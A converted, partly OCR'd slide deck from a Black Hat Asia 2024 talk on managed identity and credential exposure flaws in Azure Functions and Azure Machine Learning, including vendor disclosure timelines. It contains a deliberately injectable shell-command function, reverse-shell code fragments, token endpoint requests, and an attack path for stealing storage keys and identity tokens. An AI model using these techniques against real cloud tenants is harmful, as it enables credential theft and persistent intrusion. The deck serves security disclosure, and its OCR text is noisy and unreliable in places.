---
title: "Breaking Managed Identity Barriers In Azure Services"
speakers: ["Nitesh Surana", "David Fiser"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2024"
edition: "ASIA"
year: 2024
source_pdf: "BlackHat ASIA 2024-Slides/Nitesh Surana & David Fiser-Breaking Managed Identity Barriers In Azure Services.pdf"
pages: 98
sha256: "00e9ea402558bb6b676b8d17ed4c45ec07150145c85afb1f1d481301a52fc4ae"
text_chars: 21792
ocr_pages: 34
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.8
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:50:07Z"
---
# Breaking Managed Identity Barriers In Azure Services

**Speakers:** Nitesh Surana, David Fiser  
**Conference:** Black Hat ASIA 2024  
**Source:** `BlackHat ASIA 2024-Slides/Nitesh Surana & David Fiser-Breaking Managed Identity Barriers In Azure Services.pdf` (98 pages)


## Slide 1

#### Breaking Managed Iden-ty Barriers in Azure Services

David Fiser, Nitesh Surana

#BHASIA @BlackHatEvents

## Slide 2

- From Sikkim, India

- Senior Threat Researcher (Cloud)

- Presented at Black Hat USA, HITB, HackInParis...

- VulnerabiliBes in cloud services via Zero Day IniBaBve

• X: @_niteshsurana || Web: niteshsurana.com

#BHASIA  @BlackHatEvents

## Slide 3

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft Azure Service Fabric WAagent Exposure of Resource to Wr
Disclosure Vulnerability
ZDI-23-002
ZDI-CAN-18519
CVEID CVE-2023-21531
CVSS SCORE 5.3, (AV:L/AC:H/PR:H/UI:N/S:C/C:H/I|:N/A:N)
AFFECTED VENDORS Microsoft
AFFECTED PRODUCTS Azure
VULNERABILITY DETAILS = This vulnerability allows local attackers to disclose sensitive information on Micr
ability to execute high-privileged code within a container on the target system in
The specific flaw exists within the WAagent daemon. The issue results from insu
attacker can leverage this vulnerability to disclose stored credentials, leading to
ADDITIONAL DETAILS Microsoft has issued an update to correct this vulnerability. More details can be
DISCLOSURE TIMELINE 2022-09-20 - Vulnerability reported to vendor
2023-01-18 - Coordinated public release of advisory
CREDIT David Fiser (Trend Micro - Proiect Nebula)
```

## Slide 4

##### The Art

Azure Functions

Azure Machine Learning

Managed Identities

#BHASIA  @BlackHatEvents

## Slide 5

##### The Ar(sts

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
The Artists
#BHASIA
@BlackHatEvents
```

## Slide 6

### EPISODE I: Azure Functions

#BHASIA  @BlackHatEvents

## Slide 7

##### Azure Func(ons

- Serverless plaNorm

- User code inside CSP

#BHASIA  @BlackHatEvents

## Slide 8

##### Azure Functions

Any user code!?

• Running user code

\```
import azure.functions as func
import os
\```

\```
defmain(req: func.HttpRequest) -> func.HttpResponse:
val = req.params.get('msg')
\```

\```
return check_output("echo '{0}'".format(val), shell=True)
\```

#BHASIA  @BlackHatEvents

## Slide 9

##### Azure Functions

- AuthenBcaBon

• Triggers

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 77/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ASIA 2024 = < N
Azure Functions
e Authentication
° Triggers
```

## Slide 10

##### Research

- Simulation of compromise

- Analysis of environment

- Configuration changes

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 77/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ASIA 2024 AEE
Research
5 5 “authLevel": "function",
6 def main(req: func.HttpRequest) -> func.HttpResponse: 6 "type": “httpTrigger",
7 s=socket. socket (socket.AF_INET, socket. SOCK_STREAM) 7 “direction": "in",
8 s.connect( -4242)) 8 “name": “rea”,
coee ubuntu@ip-172-26-1-174: ~ X31
root
# 1s
ls
headers host.json oryx-manifest.toml requirements.txt reverse
```

## Slide 11

##### Authentication

- Tokens

- Client certificate

- Custom logic

#BHASIA  @BlackHatEvents

## Slide 12

##### Triggers

• HTTP(s) request

- Events

#BHASIA  @BlackHatEvents

## Slide 13

##### Timeouts

5 m

4.5 m

#BHASIA  @BlackHatEvents

## Slide 14

##### Environment analysis

- whoami

- mount, capsh

- env

#BHASIA  @BlackHatEvents

## Slide 15

##### Environment variables

- Popular pracBce in DevOps

- OWen stores secrets

   - References as a **!!! VAULT !!!**

#BHASIA  @BlackHatEvents

## Slide 16

##### Environment variables

###### • Fundamentals

unless a new table **passed as arguments**

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Environment variables
¢ Fundamentals
0@e@e root@ip-172-26-1-174: /home/ubuntu X31 |
root@ip-172-26-1-174:/home/ubuntu# 1s /proc/1
attr cmdline | environ | io mem ns pagemap schedstat stat timers
autogroup comm exe limits mountinfo numa_maps personality sessionid statm uid_map
auxv coredump_filter fd loginuid mounts oom_adj projid_map setgroups status wchan
cgroup cpuset fdinfo map_files mountstats oom _score root smaps syscall
clear_refs owd gid_map maps net oom_score_adj sched stack task
unless a new table passed as arguments
```

## Slide 17

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 78/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
bk cee ubuntu@ip-172-26-1-174: ~/env_test &
ubuntu@ip-172-26-1-174: $ nano main.cpp
ubuntu@ip-172-26-1-174: $ g++ main.cpp -o app
ubuntu@ip-172-26-1-174: $ cat main.cpp
using namespace std;
int mainCint argc, char** argv){
cout << "Hello World” << endl;
return 0;
}
ubuntu@ip-172-26-1-174; $ export API_KEY«SuperSecretValue@123
ubuntu@ip-172-26-1-174: $ qdb app
: OxOO7FFFFFFFeESZ8 [+ [OxOO7FFFFFFfe775 + “XDG_SESSION_ID=59847"
$rsi : @xOO7fffFFffeS18 + O@xO07fffffffe7Sb +] “/home/ubuntu/env_test/app"
_get<wchar_t,+@> mov rax, QWORD PTR [rip+@x25a
ts
```

## Slide 18

##### Environment variables

Is this some debugger magic?

https://github.com/torvalds/linux/blob/23956900041d968f9ad0f30db6dede4 #BHASIA  @BlackHatEvents daccd7aa9/fs/binfmt_elf_fdpic.c#L64

#BHASIA  @BlackHatEvents

## Slide 19

###### **AzureWebJobsStorage**

###### **CONTAINER_ENCRYPTION_KEY**

###### **CONTAINER_START_CONTEXT_SAS_URI**

#BHASIA  @BlackHatEvents

## Slide 20

##### AzureWebJobsStorage

source code

Azure Function

Storage Account

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
YOU HAVE BEEN HACKED!!!
AzureWebJobsStorage
Not Secure — nebula-test.azurewebsites.net
```

## Slide 21

##### CONTAINER_START_CONTEXT_SAS_URI

`{{ "encryptedContext" : "Lk8nHZ/2m+6TGuK0pfhtNA==./cYdq+AnpWjICTECMSDgT5SsgFPGm6ouZFtlY7UzQUXvdEiE"encryptedContext" : "` **`AES_IV . payload . SHA256`** `" }kDsDSQreIAZNoeFRcIUmFuZG9tIENoYXJhY3RlciBHZW5lcmF0b3IKCkJhcmRvdCBCcnVzaApo dHRwczovL2JhcmRvdGJydXNoLmNvbSDigLogY2hhcmFjdGVyLWdlbmVyYXRvcgoKVGhpcyB0b2 9sIGdpdmVzIHlvdSBpZGVhcyBmb3IgdW5pcXVlIGNoYXJhY3RlcnMgdG8gZHJhdyEgVXNlIHRo ZSBkZXNjcmlwdGlvbiB0byBkZXRlcm1pbmUgdGhlIGNoYXJhY3RlcidzIHBoeXNpY2FsIGFwcG VhcmFuY2UgYXMgd2VsbCBhcyB0aGVpciBzdXJyb3VuZGluZ3MsIC4uLgoKQdoZW4geW91IHByZ XNzIHRoZSBidXR0b25zLCB0aGV5IHdpbGwgZ2VuZXJhdGUgLi4uCg==.YWJjZGVmZ2hpamtsbW 5vcHFydHN0YXNma2FzZmQ5NHUwMjNmYXM5MDAxZmtlaWxpZXV5Nzk3OTcyMTM0MTI0NA=="` **CONTAINER_ENCRYPTION_KEY** `}`

#BHASIA  @BlackHatEvents

## Slide 22

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 54/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recipe
From Base64
Alphabet
A-Za-z0-9+/=
Remove non-alphabet chars
AES Decrypt
Key
IV
Lk8nHZ/2m+6TGuK@pf htNA==
Mode Input Output
CBC Raw Raw
Ou
BASE64 ~
length: 9196
lines: 1
NoeFRcIvnEZ/Hkaa4yeyg214b1TBz71cT7Lf/TFG3F0783HzpwgvEe Lbu+HWAWV f d8WK9MOe0y8q4eHKvqwa9uqXBTSfLbNr2oUms
nD4x6ATtdDO9Cw8+f Ij AQGRskuazEOyyPf+ingAkj 7Gj jwaL85T LFZSpOykIN6t+BoQQALavdTVOtnQwyd8xBQU9dp56 iMPJBAiU+
end: 6891
length: 6891
{"SiteId":767064730,"SiteName":"nebula-test","EncryptedEnvironment":"3 | VizDzTy30ag/PHD1E7gwWg==
Nm5tK4ogMk8 f gGt iLQgELuSugTYq8HoQaG5p+CGGFNI bwhhQbj 2kVy fewd LAESgXADXUPW6+c riRqdJgqvjF6/66kxGJqL3U0QEGk
ZaBuIUMu1Zk/kEwC6JyKmQf0Owef 2t4ApQM LpC8DWNgI2pGU83 iM f 2meVUMEyxj pEZh2xdj J iHN9dj vSj xpS4Q+4NT2G4n1EimPXS
Input
time: 3ms
length: 6891
lines: 1
Output
```

## Slide 23

##### Decrypted context

- Authentication tokens

- **Managed identity proxy settings**

#BHASIA  @BlackHatEvents

## Slide 24

##### Managed Identities

Azure Function

Storage Account
STORAGE_ACCOUNT_CREDENTIALS

Image

#BHASIA  @BlackHatEvents

## Slide 25

##### Managed Identities

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
A
blackhat
Managed Identities
GET /msi/token?resource=https : //management .azure.com&api-version=2019-@8-@1 HTTP/1.1
User-Agent: curl/7.74.0
Accept: */*
X-IDENTITY-HEADER: 7QDBF9CBQ4554E9E8E210A70CD4D2974
Mark bundle as not supporting multiuse
HTTP/1.1 20@ OK
Date: Thu, 31 Mar 2022 13:06:34 GMT
Content-Type: application/json; charset=utf-8
Server: Kestrel
Transfer-Encoding: chunked
#BHASIA
@BlackHatEvents
```

## Slide 26

##### Managed Identities

#BHASIA  @BlackHatEvents

## Slide 27

##### Findings

- Environment variables

- Proxy parameters

- **Valid JWT tokens outside Azure**

#BHASIA  @BlackHatEvents

## Slide 28

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 49/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
david_fiser@CZ-64PZE33B LeakPoC % 1s
README . txt
TokenServiceContainer.pdb
test1.deps.json
test1.runtimeconfig. json
```

## Slide 29

##### Why?

- Environment variables popularity

- Not knowing fundamentals

- Ignoring the risks

#BHASIA  @BlackHatEvents

## Slide 30

What do you suggest David?

#BHASIA  @BlackHatEvents

## Slide 31

##### Why?

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Why: ram (argc + 5) * ( *);
Cloud
Stronger Cloud Security in Azure Functions
Using Custom Cloud Container
ret;
```

## Slide 32

Disclosure Timeline

04 / 22 – Issue found 05 / 22 – Issue shared with MS 06 / 22 – blogpost released 07 / 23 NetSPI discovers the issue 09 / 23 Fix in progress

hNps://www.netspi.com/blog/technical/cloud-penetraPon-tesPng/mistaken-idenPty-azure-funcPon-apps/

#BHASIA  @BlackHatEvents

## Slide 33

### EPISODE II: Azure ML

#BHASIA  @BlackHatEvents

## Slide 34

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 78/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
2 Copilot Azure OpenAl Service
Your everyday Al companion
Document1
Home insert Layout References Review View’ Help
Aptos (Body) vy wv B E Uv #v Avy eee
< » Create content with Copilot
draft a proposal from yesterday's J { meeting notes|
% O
```

## Slide 35

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
pplied Al Services
A
\ Bot Service | Cognitive Search | Form Recognizer | Video Indexer | Metrics Advisor | Immersive aw,
Cognitive Services
Vision Speech Language Decision
Azure Machine Learning
Azure OpenAl Service
ds
Prepare & Preprocess | Build, Train & Consume | Deploy & Scale | Manage & Monitor
#BHASIA
@BlackHatEvents
```

## Slide 36

##### Azure Machine Learning

#BHASIA  @BlackHatEvents

## Slide 37

##### Storage Account

Jupyter Notebooks
Datasets Logs
Models Snapshots
Python Scripts

#BHASIA  @BlackHatEvents

## Slide 38

##### Compute Instance

Jupyter
GPU Drivers VSCode
Conda Docker
PyTorch Python
TensorFlow

#BHASIA  @BlackHatEvents

## Slide 39

##### Compute Instance

#BHASIA  @BlackHatEvents

## Slide 40

##### Approach

- Inspect network traffic

- Running processes

- Reverse CSP agents

- Examine default logs

#BHASIA  @BlackHatEvents

## Slide 41

#BHASIA  @BlackHatEvents

## Slide 42

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 53/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Storage
| Access Key
™ Managed
», Identities
#BHASIA
```

## Slide 43

User Assigned Managed IdenBty

#BHASIA  @BlackHatEvents

## Slide 44

System Assigned Managed IdenBty
System Assigned Managed Identity

#BHASIA  @BlackHatEvents

## Slide 45

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Sign in with a managed identity
On resources configured for managed identities for Azure resources, you can sign
in using the managed identity. Signing in with the resource's identity is done
through the --identity flag.
Azure CLI [fy Copy Open Cloudshell
az login --identity
```

## Slide 46

##### az login --identity

GET /MSI/auth/?resource=https://management.core.windows.net/&apiversion=2017-09-01 HTTP/1.1 Host: 127.0.0.1:46808 User-Agent: python-requests/2.31.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive secret: 6cvsqlMIRvIyURbztZ3P

idenBtyresponderd

#BHASIA  @BlackHatEvents

## Slide 47

##### identityresponderd

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 52/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
identityresponderd
[Unit ]
Description=Azure Batch AI Identity Responder Daemon
EnvironmentFile=-/etc/environment
EnvironmentFile=-/etc/environment.sso
EnvironmentFile=-/mnt/batch/tasks/startup/wd/dsi/dsixdsenv
WorkingDirectory=/mnt/batch/tasks/startup/wd
```

## Slide 48

##### identityresponderd

/etc/environment.sso

/mnt/azmnt/.nbvm

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 75/100 on the text kept, 53/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
identityresponderd
/etc/environment.sso =m MST_ENDPOINT=http://127.0.0.1:46808/MSI/auth
MST_SECRET=6cvsq LMIRvVIyURbztZ3P
/mnt/azmnt/.nbvm
certurl=https://<REGION>.cert.api.azureml.ms/nbip/token
```

## Slide 49

##### Outbound Traffic from identityresponderd

POST

/nbip/token/subscripMons/<SUB>/resourceGroups/<RG>/workspaces/<WS>/comput es/<CI_NAME>

Host: <REGION>.cert.api.azureml.ms certThumbprint=<THUMBPRINT> instanceld=<CI_NAME> resource=hWps%3А%2F%2Fmanagement.core.windows.net%2F

_/mnt/batch/tasks/startup/certs/_ sha1-<THUMBPRINT>.{pem,key}

#BHASIA  @BlackHatEvents

## Slide 50

identityresponderd

200 OK with M.I. JWT

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
A
blackhat
identityresponderd
=¢
200 OK with M.1. JWT
#BHASIA
```

## Slide 51

401 Unauthorized

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
A
blackhat
I \
I |
(
| |
I |
401 Unauthorized
```

## Slide 52

# ≠

#BHASIA  @BlackHatEvents

## Slide 53

##### Let’s see _everything_

#BHASIA  @BlackHatEvents

## Slide 54

##### dsimountagent

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
dsimountagent
[Unit]
Description=Azure Batch AI DSI Mounting Agent
WorkingDirectory=/mnt/batch/tasks/startup/wd/dsi
ExecStart=/mnt/batch/tasks/startup/wd/dsimountagent
StandardError=syslog
Syslogidentifier=dsimountagent
Cs, EnvironmentFile=/mnt/batch/tasks/startup/wd/dsi/dsimountagentenv
|
```

## Slide 55

Spying The Scien(st

/ci-api/v1.0/services/jupyter/logs

azureuser : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND= **/usr/bin/cat /etc/shadow**

#BHASIA  @BlackHatEvents

## Slide 56

##### Spying The Scien(st

<u>h"ps://msrc.microso-.com/update-guide/vulnerability/CVE-2023-28312</u>

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
| MLSEQ | Spying The Scientist
Azure Machine Learning Information Disclosure Vulnerability
CVE-2023-28312
Security Vulnerability
Released: Apr 11, 2023 Last updated: Aug 22, 2023 wy
Assigning CNA: © Microsoft
Impact: Information Disclosure Max Severity: Important
CVSS:3.16.5/5.7 ©
```

## Slide 57

##### Config of dsimountagent

A section of environment variables used by DSIMountAgent

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Config of dsimountagent
AZ_BATCHAI_CLUSTER_PRIVATE_KEY_PEM=----- BEGIN PRIVATE KEY----- ;localKey:
AZ_BATCHAI_XDS_ENDPOINT=https://eastasia.cert.api.azureml.ms/xdsbatchai
A section of environment variables used by DSIMountAgent
```

## Slide 58

##### Purpose of dsimountagent

checks & mounts

File Share

every 120s

Compute Instance

#BHASIA  @BlackHatEvents

## Slide 59

dsimountagent

$AZ_BATCHAI_XDS_ENDPOINT

#BHASIA  @BlackHatEvents

## Slide 60

##### Outbound Traffic from dsimountagent

#BHASIA  @BlackHatEvents

## Slide 61

##### Fetching AML Workspace Informa(on

fn: hosjools/clients. **GetWorkspaceInfo**

dsimountagent

AML Workspace Metadata

$AZ_BATCHAI_XDS_ENDPOINT

#BHASIA  @BlackHatEvents

## Slide 62

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 75/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
"id": "/subscriptions/ ire:
"location": "eastasia",
“tags": {},
"properties": {
"friendlyName": “amldemo",
“storageAccount": "/subscriptions
"keyVault": "/subscriptions/
applicationInsights": "/subscriptions
“imageBuildCompute": null,
"“provisioningState": "Succeeded",
"“subscriptionResourceGroupMoveState": null,
"“subscriptionState": null,
“subscriptionStatusChangeTimeStampUtc": null,
```

## Slide 63

##### Fetching Storage Account Key

fn: hosttools/clients. **GetWorkspaceSecrets**

dsimountagent

$AZ_BATCHAI_XDS_ENDPOINT

Storage Account JWE

#BHASIA  @BlackHatEvents

## Slide 64

$AZ_LS_ENCRYPTED_SYMMETRIC_KEY Decrypted Symmetric Key $AZ_BATCHAI_CLUSTER_PRIVATE_KEY_PEM

_dsimountagentenv/dsiidlestopagentenv_

Decrypted Symmetric Key JWE of Storage Account Access Key

Storage Account Access Key

#BHASIA  @BlackHatEvents

## Slide 65

##### Attack Scenario

Certificate + Private Key
Storage Account Access Key
Environment Variables

#BHASIA  @BlackHatEvents

## Slide 66

Does rotating the key help?

#BHASIA  @BlackHatEvents

## Slide 67

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Hor
3B amidemo x
Azure c Learn
Search
Download config.json
@ Overview
/ Essentials
Activity log
Resource group
2 Access control (IAM) ves
¢ Tags
Location
e Diagnose and solve problems EasvAst
— Subscription
vents
esear ena
Settings Subscription ID
22c8fb2-0e66-4db5-86
Networking 022c8fb2-0e66-4db5-8628
Storage
Bash v
Requesting a Cloud Shell.Succeeded.
Connecting terminal...
nitesh [ ~ ]$ []
Delete
Studio web URL
ttps Lazu
Container Registry
testcontainereg
Key Vault
amldemo6956742¢
Application Insights
MLflow tracking UR
azureml://eastasia.api.azur...
x
aL
```

## Slide 68

_Does the story end here?_

#BHASIA  @BlackHatEvents

## Slide 69

##### Cloud Agents

👑

👑

👑

👑

#BHASIA  @BlackHatEvents

## Slide 70

##### Fetching more {“RequestType”:”?”}

hosWools/clients. **GetWorkspaceSecrets**

hosttools/clients. **generateXDSApiRequestSchema**

#BHASIA  @BlackHatEvents

## Slide 71

##### Fetching System Assigned MI JWT

fn: hosWools/clients. **GetAADToken**

$AZ_BATCHAI_XDS_ENDPOINT

Entra ID JWT of Managed Identity

identityresponderd

#BHASIA  @BlackHatEvents

## Slide 72

Entra ID JWT of System Assigned Managed IdenBty

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ASIA 2024 Se
Entra ID JWT of System Assigned Managed Identity
```

## Slide 73

##### Fetching User Assigned MI JWT

fn: hosttools/clients. **GetAADToken**

idenMtyresponderd

$AZ_BATCHAI_XDS_ENDPOINT Entra ID JWT of Managed Identity

#BHASIA  @BlackHatEvents

## Slide 74

##### Recap

$AZ_BATCHAI_XDS_ENDPOINT ‘whoami’ of AML Workspace Storage Account Access Key Managed IdenBty JWTs …

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recap
afi
~
$AZ_BATCHAI_XDS_ENDPOINT
‘whoami’ of AML Workspace
Storage Account Access Key
Managed Identity JWTs
```

## Slide 75

But we can use the logs, right?

#BHASIA  @BlackHatEvents

## Slide 76

##### Legitimate Activity

$ az login --iden(ty

Fetching Managed Identity JWT from a Compute Instance

#BHASIA  @BlackHatEvents

## Slide 77

##### Malicious Ac(vity

$AZ_BATCHAI_XDS_ENDPOINT

Entra ID JWT of Managed Identity

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 63/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Malicious Activity
“RequestType": "getaadtoken",
$AZ_BATCHAI_XDS_ENDPOINT
Entra ID JWT of Managed Identity
```

## Slide 78

##### Generated Logs

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
A
Generated Logs
+ Downloads diff Attacker.json Compute-Instance. json
2,3c2,3
< "id": "17a0e470-7eH0-4b76—-aa3e—-42F8F5bcH600" ,
< "createdDateTime": "2023-07-15T11:07:07Z",
> "id": "e089d82d-16f6—-4F95-8878-Ffilua8a3ad300",
> "createdDateTime": "2023-07-15T10:54:48Z",
13c13
< "correlationId": "Od34d004-6b11-4523-801f-2194Fb9bU6b2" ,
> "correlationId": "36c3b381-7baf-—436d-8909- Activity Details: Sign-ins
48cH8
< "uniqueTokenIdentifier": "cOSgFOB-dkugPkL4
> "uniqueTokenIdentifier": "LdiJ4PYWLU-IePFK
+» Downloads IP address
Autonomous system number
#BHASIA
@BlackHatEvents
```

## Slide 79

How to detect stolen certs?

#BHASIA  @BlackHatEvents

## Slide 80

#BHASIA  @BlackHatEvents

## Slide 81

Why is this even a vulnerability?

#BHASIA  @BlackHatEvents

## Slide 82

h"ps://learn.microso1.com/en-us/azure/ac5ve-directory/managed-iden55es-azure-resources/overview

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ASIA 2024 ~~ \
System assigned Some Azure resources, such as virtual mactwnes allow you
to enable a managed identity directly on the resource. When you enable a
system assigned managed identity
© A service principal of a special type is created in Azure AD for the identity.
The service principal is ted to the lifecycle of that Azure resource. When
the Azure resource deleted. Azure automatically deletes the service
principal for you
_ You authonze the managed identity to have access to one or more
~The name of the system-assigned service principal s always the same as
the name of the Azure resource it 1s created for For a deployment siot. the
name of its system assigned identity ‘5 <app-nene>/slote/<slet-neme>
https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview
```

## Slide 83

This is trust.. But did you verify ?

#BHASIA  @BlackHatEvents

## Slide 84

#BHASIA  @BlackHatEvents

## Slide 85

##### 🔥 Call Azure Support!

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Call Azure Support! é
Azure Managed Identity can obtain a token from Managed Identity endpoint from inside
the Azure Virtual Network. The token acquisition endpoint for the managed identities
‘http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-
01&resource=https%3A%2F %2Fvault.azure.net&client_id=<UAMI CLIENT ID>' is not
accessible from outside of the resource, hence the token acquisition call needs to come
from the resource to which the managed identity is assigned.
Due to which the
sign-in logs don't show any IP Address
but you can reference it to the
private IP of the resource making the token acquisition call.
```

## Slide 86

##### 🔥 Call Azure Support!

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
blackhat =
Call Azure Support! é
Is it implied that public IP address of the resource from where a MI token has been
fetched will not be visible in any of the log sources across Azure such as Microsoft
Graph logs?
[A] No,|Microsoft Entra doesn't record the IP address of the source|while populating
the sign-in. It is assumed that the sign-in happened from the targeted managed
identity resource.
```

## Slide 87

##### Persistence

- Fetch rotated keys, MI JWTs, etc.

- CerBficate valid for two years

🔥

- Logging discrepancies ==

#BHASIA  @BlackHatEvents

## Slide 88

##### Disclosure Timeline

04/07/23 – ZDI reported the vulnerability to the vendor. 04/11/23 – The vendor acknowledged the report. 07/13/23 – ZDI asked for an update.

07/19/23 – The vendor asked us to join a call to discuss the report.

07/19/23 – ZDI joined the call and provided the vendor with addiPonal details.

07/20/23 – The vendor states that they are considering this bug low severity and that they would release a fix in 30-45 days.

07/20/23 – The ZDI informed the vendor that the case is due on 08/05/23 and that we are publishing this case as a zero-day advisory on 08/09/23.

<u>https://www.zerodayinitiative.com/advisories/ZDI-23-1056/</u>

#BHASIA  @BlackHatEvents

## Slide 89

##### References

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
References
You Can't See Me
Achieving Stealthy Persistence in Azure Machine
Learning
Inthe latest installment of our Ongoing series where we identify.and investigate
security flaws in Azure Machine Learning (AML), we explore how. cybercriminals
could manage to covertly gain persistence in AML workspaces:
```

## Slide 90

How many services support M.I.?

#BHASIA  @BlackHatEvents

## Slide 91

## 50+ Azure Services

https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/managed-identities-status#services-supporting-managed-identities

#BHASIA  @BlackHatEvents

## Slide 92

##### Future Scope: Azure Services x M.I.

🎯

|API Management|Azure Container Instance|Azure Event Hubs|
|---|---|---|
|Application Gateway|Azure Container Registry|Azure Image Builder|
|**Azure App Services**|**Azure Machine Learning**|Azure IoT Hub|
|Azure Arc|Azure Data Box|Azure Kubernetes Service|
|Azure Automanage|Azure Data Explorer|Azure Logic Apps|
|Azure Automation|Azure Data Factory|Azure Log Analytics|
|Azure Batch|Azure Data Lake|Azure Media services|
|Azure Blueprints|Azure Data Share|Azure Service Fabric|
|Azure Cache|Azure DevTest Labs|Azure Stack Edge|
|Azure Container Apps|Azure Event Grid|Azure Virtual Machines|

#BHASIA  @BlackHatEvents

## Slide 93

##### Takeaways

- Use environment variables carefully

- Threat model CSP services

- Least privilege for identities

- Examine Cloud APIs & find 🔥 bugs

#BHASIA  @BlackHatEvents

## Slide 94

##### Takeaways

- Test & Secure AuthN & AuthZ scopes

- AcBonable logging for detecBon

- Assume Breach scenarios & edge cases

- Challenge official documentaBon

#BHASIA  @BlackHatEvents

## Slide 95

##### Acknowledgements

X: @thezdi

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Acknowledgements
ZERO DAY
INITIATIVE
X: @thezdi
```

## Slide 96

##### Q/A

Source: https://surveysparrow.com/blog/funny-customer-service-memes/

#BHASIA  @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Q/A
| HAVE A VERY PARTICULAR SET OF SKILLS.
| WILL FIND YOUR QUESTIONS,
AND I whdbace ANSWER THEM
Source : https://surveysparrow.com/blog/funny-customer-service-memes/
```

## Slide 97

👇

##### Find us

niteshsurana.com

x.com/anu4is

#BHASIA  @BlackHatEvents

## Slide 98

⚡

##### ⚡ Black Hat Sound Bytes

Assume breach x edge cases == variants of bugs Challenge official documentation

Examine Cloud APIs & find 🔥 bugs

#BHASIA  @BlackHatEvents
